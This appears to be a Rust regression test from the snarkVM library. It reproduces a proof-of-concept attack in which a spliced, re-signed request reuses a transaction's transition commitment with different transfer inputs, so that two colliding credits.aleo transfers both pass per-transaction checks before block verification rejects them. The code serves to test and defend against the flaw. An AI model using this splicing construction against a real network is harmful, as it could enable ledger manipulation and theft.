// Copyright (c) 2019-2026 Provable Inc.
// This file is part of the snarkVM library.

// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at:

// http://www.apache.org/licenses/LICENSE-2.0

// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use crate::vm::{
    VM,
    test_helpers::{
        CurrentAleo,
        CurrentNetwork,
        LedgerType,
        sample_genesis_private_key,
        sample_next_block,
        sample_vm_at_height,
    },
};

use console::{
    account::{Address, PrivateKey, Signature},
    network::{ConsensusVersion, prelude::*},
    program::{Identifier, InputID, ProgramID, Request, Value, ValueType, compute_function_id},
    types::{Field, Group},
};
use itertools::Itertools;
use snarkvm_algorithms::snark::varuna::VarunaVersion;
use snarkvm_ledger_block::Transaction;
use snarkvm_ledger_query::Query;
use snarkvm_synthesizer_error::VmCheckBlockContentError;
use snarkvm_synthesizer_process::{Authorization, Process, execution_cost};
use snarkvm_utilities::TestRng;

use std::str::FromStr;

/// Two `Authorization`s with the same `tcm` and different `tpk` (PoC collision pair).
struct CollisionPair {
    tcm: Field<CurrentNetwork>,
    tpk1: Group<CurrentNetwork>,
    tpk2: Group<CurrentNetwork>,
    auth1: Authorization<CurrentNetwork>,
    auth2: Authorization<CurrentNetwork>,
}

/// Build the pair using distinct public inputs for tx1 vs tx2.
#[allow(clippy::too_many_arguments)]
fn build_collision_pair_distinct_inputs(
    process: &Process<CurrentNetwork>,
    private_key: &PrivateKey<CurrentNetwork>,
    program_id: ProgramID<CurrentNetwork>,
    function_name: Identifier<CurrentNetwork>,
    input_types: &[ValueType<CurrentNetwork>],
    inputs1: Vec<Value<CurrentNetwork>>,
    inputs2: Vec<Value<CurrentNetwork>>,
    rng: &mut TestRng,
) -> CollisionPair {
    assert_eq!(inputs2.len(), input_types.len(), "inputs2 length must match input_types");

    let auth1 = process
        .authorize::<CurrentAleo, _>(private_key, program_id, function_name, inputs1.into_iter(), rng)
        .expect("authorize tx1");
    let request1 = auth1.peek_next().expect("auth1.peek_next");
    let tvk1 = *request1.tvk();
    let tcm1 = *request1.tcm();
    let scm1 = *request1.scm();
    let tpk1 = request1.to_tpk();

    let function_id =
        compute_function_id(request1.network_id(), &program_id, &function_name).expect("compute_function_id");

    let mut input_ids2: Vec<InputID<CurrentNetwork>> = Vec::with_capacity(inputs2.len());
    for (idx, (input, vt)) in inputs2.iter().zip_eq(input_types.iter()).enumerate() {
        let idx16 = u16::try_from(idx).expect("input index fits u16");
        let input_id = match vt {
            ValueType::Constant(_) => InputID::constant(function_id, input, tcm1, idx16),
            ValueType::Public(_) => InputID::public(function_id, input, tcm1, idx16),
            ValueType::Private(_) => InputID::private(function_id, input, tvk1, idx16),
            ValueType::ExternalRecord(_) => InputID::external_record(function_id, input, tvk1, idx16),
            ValueType::DynamicRecord => InputID::dynamic_record(function_id, input, tvk1, idx16),
            ValueType::Record(_) | ValueType::Future(_) | ValueType::DynamicFuture => {
                panic!("PoC splice helper only supports constant/public/private/external-record/dynamic-record")
            }
        }
        .expect("InputID compute");
        input_ids2.push(input_id);
    }

    let is_root_field = Field::<CurrentNetwork>::one();
    let mut message: Vec<Field<CurrentNetwork>> = Vec::with_capacity(5 + 4 * input_ids2.len());
    message.push(tvk1);
    message.push(tcm1);
    message.push(function_id);
    message.push(is_root_field);
    for input_id in &input_ids2 {
        match input_id {
            InputID::Constant(id)
            | InputID::Public(id)
            | InputID::Private(id)
            | InputID::ExternalRecord(id)
            | InputID::DynamicRecord(id) => message.push(*id),
            InputID::Record(commitment, gamma, _record_view_key, serial_number, tag) => {
                message.push(*commitment);
                message.push(gamma.to_x_coordinate());
                message.push(*serial_number);
                message.push(*tag);
            }
        }
    }

    let sig2 = Signature::sign(private_key, &message, rng).expect("Signature::sign tx2");

    let request2 = Request::<CurrentNetwork>::from((
        *request1.signer(),
        *request1.network_id(),
        program_id,
        function_name,
        input_ids2,
        inputs2,
        sig2,
        *request1.sk_tag(),
        tvk1,
        tcm1,
        scm1,
        request1.is_dynamic(),
    ));

    let tpk2 = request2.to_tpk();
    assert_ne!(tpk1, tpk2, "expected distinct tpk after fresh Schnorr nonce");

    let auth2 = Authorization::new(request2);
    CollisionPair { tcm: tcm1, tpk1, tpk2, auth1, auth2 }
}

fn varuna_version_at_height(height: u32) -> VarunaVersion {
    let consensus = CurrentNetwork::CONSENSUS_VERSION(height).expect("CONSENSUS_VERSION");
    if (ConsensusVersion::V1..=ConsensusVersion::V3).contains(&consensus) {
        VarunaVersion::V1
    } else {
        VarunaVersion::V2
    }
}

/// Full execute transaction with minimum public fee (mirrors `/tmp/poc/attacker/src/splice.rs` `build_one_transaction`).
///
/// After all transactions for a candidate block are built, run [`sample_next_block`] then
/// [`VM::check_block_content_from_tip`] on the same [`VM`] to match ledger acceptance checks
/// (speculation dry-run and full [`snarkvm_ledger_block::Block::verify`]).
fn build_execute_transaction_with_public_fee(
    vm: &VM<CurrentNetwork, LedgerType>,
    private_key: &PrivateKey<CurrentNetwork>,
    authorization: Authorization<CurrentNetwork>,
    rng: &mut TestRng,
) -> Transaction<CurrentNetwork> {
    let process = vm.process();
    let query = Query::from(vm.block_store());
    let height = vm.block_store().current_block_height();
    let consensus = CurrentNetwork::CONSENSUS_VERSION(height).expect("CONSENSUS_VERSION");
    let varuna_version = varuna_version_at_height(height);

    let request = authorization.peek_next().expect("authorization.peek_next");
    let locator = format!("{}/{}", request.program_id(), request.function_name());

    let (_response, mut trace) = process.execute::<CurrentAleo, _>(authorization, rng).expect("process.execute (main)");
    trace.prepare(&query).expect("trace.prepare (main)");
    let execution =
        trace.prove_execution::<CurrentAleo, _>(&locator, varuna_version, rng).expect("prove_execution (main)");

    let (min_cost, _) = execution_cost(process.as_ref(), &execution, consensus).expect("execution_cost");
    let execution_id = execution.to_execution_id().expect("to_execution_id");
    let fee_auth = process
        .authorize_fee_public::<CurrentAleo, _>(private_key, min_cost, 0u64, execution_id, rng)
        .expect("authorize_fee_public");
    let (_fee_response, mut fee_trace) =
        process.execute::<CurrentAleo, _>(fee_auth, rng).expect("process.execute (fee)");
    fee_trace.prepare(&query).expect("trace.prepare (fee)");
    let fee = fee_trace.prove_fee::<CurrentAleo, _>(varuna_version, rng).expect("prove_fee");

    Transaction::from_execution(execution, Some(fee)).expect("Transaction::from_execution")
}

fn execution_transfer_tcm(tx: &Transaction<CurrentNetwork>) -> Field<CurrentNetwork> {
    let execution = tx.execution().expect("execute transaction");
    *execution.transitions().next().expect("root transition").tcm()
}

fn execution_transfer_tpk(tx: &Transaction<CurrentNetwork>) -> Group<CurrentNetwork> {
    let execution = tx.execution().expect("execute transaction");
    *execution.transitions().next().expect("root transition").tpk()
}

/// Exercises the PoC end-to-end: colliding execute `tcm` / distinct `tpk`, `Request::verify`, full txs,
/// per-tx `check_transaction`, beacon block with both candidates, `VM::check_block_content_from_tip`,
/// then `VM::add_next_block`.
#[test]
fn duplicate_tcm_splice_transfer_public_distinct_inputs_reachable() {
    let rng = &mut TestRng::fixed(0xc0_de_42);

    let vm = sample_vm_at_height(CurrentNetwork::CONSENSUS_HEIGHT(ConsensusVersion::V15).expect("V15 height"), rng);
    let process = vm.process();

    let private_key = sample_genesis_private_key(rng);
    let recipient_a =
        Address::<CurrentNetwork>::try_from(&PrivateKey::<CurrentNetwork>::new(rng).unwrap()).expect("recipient_a");
    let recipient_b =
        Address::<CurrentNetwork>::try_from(&PrivateKey::<CurrentNetwork>::new(rng).unwrap()).expect("recipient_b");

    let program_id = ProgramID::<CurrentNetwork>::from_str("credits.aleo").expect("program id");
    let function_name = Identifier::<CurrentNetwork>::from_str("transfer_public").expect("function name");
    let inputs1 =
        vec![Value::<CurrentNetwork>::from_str(&format!("{recipient_a}")).unwrap(), Value::from_str("1u64").unwrap()];
    let inputs2 =
        vec![Value::<CurrentNetwork>::from_str(&format!("{recipient_b}")).unwrap(), Value::from_str("2u64").unwrap()];
    let input_types: Vec<ValueType<CurrentNetwork>> = vec![
        ValueType::<CurrentNetwork>::from_str("address.public").unwrap(),
        ValueType::<CurrentNetwork>::from_str("u64.public").unwrap(),
    ];

    let pair = build_collision_pair_distinct_inputs(
        process.as_ref(),
        &private_key,
        program_id,
        function_name,
        &input_types,
        inputs1,
        inputs2,
        rng,
    );

    let r1 = pair.auth1.peek_next().expect("peek r1");
    let r2 = pair.auth2.peek_next().expect("peek r2");
    assert_eq!(r1.tcm(), r2.tcm(), "duplicate tcm");
    assert_eq!(pair.tcm, *r1.tcm());
    assert_ne!(pair.tpk1, pair.tpk2, "distinct tpk");

    assert!(r1.verify(&input_types, true, None), "console verify honest request");
    assert!(r2.verify(&input_types, true, None), "console verify spliced request");

    let tx1 = build_execute_transaction_with_public_fee(&vm, &private_key, pair.auth1, rng);
    let tx2 = build_execute_transaction_with_public_fee(&vm, &private_key, pair.auth2, rng);

    assert_eq!(execution_transfer_tcm(&tx1), execution_transfer_tcm(&tx2));
    assert_ne!(execution_transfer_tpk(&tx1), execution_transfer_tpk(&tx2));

    vm.check_transaction(&tx1, None, rng).expect("check_transaction tx1");
    vm.check_transaction(&tx2, None, rng).expect("check_transaction tx2");

    // `should_abort_transaction` only dedupes `tpk`, not `tcm` (see `finalize.rs`), so both txs can be confirmed
    // in the same candidate block despite sharing a transition commitment.
    let block = sample_next_block(&vm, &private_key, &[tx1, tx2], rng).expect("sample_next_block");
    assert_eq!(
        block.transactions().num_accepted(),
        2,
        "expected both attacker txs to pass speculate; duplicate-tcm detection is block-level"
    );
    assert!(
        block.aborted_transaction_ids().is_empty(),
        "unexpected aborted txs: {:?}",
        block.aborted_transaction_ids()
    );

    let dup_tcm_in_block = block.transition_commitments().filter(|t| **t == pair.tcm).count();
    assert_eq!(dup_tcm_in_block, 2, "colliding execute transitions should repeat the same tcm in the block");

    let verify_err = vm
        .check_block_content_from_tip(&block, rng)
        .expect_err("duplicate transition commitments must fail VM::check_block_content_from_tip");
    match verify_err {
        VmCheckBlockContentError::Verification(e) => {
            assert!(e.to_string().contains("duplicate transition commitment"), "unexpected verify error: {e}")
        }
        err => panic!("expected Verification error, got {err:?}"),
    }

    let height_before = vm.block_store().max_height().expect("max_height");
    vm.add_next_block(&block).expect("VM::add_next_block should succeed for this test harness");
    assert_eq!(vm.block_store().max_height().expect("max_height after add"), height_before + 1);

    let block_hash = vm.block_store().get_block_hash(height_before + 1).unwrap().unwrap();
    let stored = vm.block_store().get_block(&block_hash).unwrap().unwrap();
    assert_eq!(
        stored.transition_commitments().filter(|t| **t == pair.tcm).count(),
        2,
        "stored block should still carry both colliding commitments"
    );
}
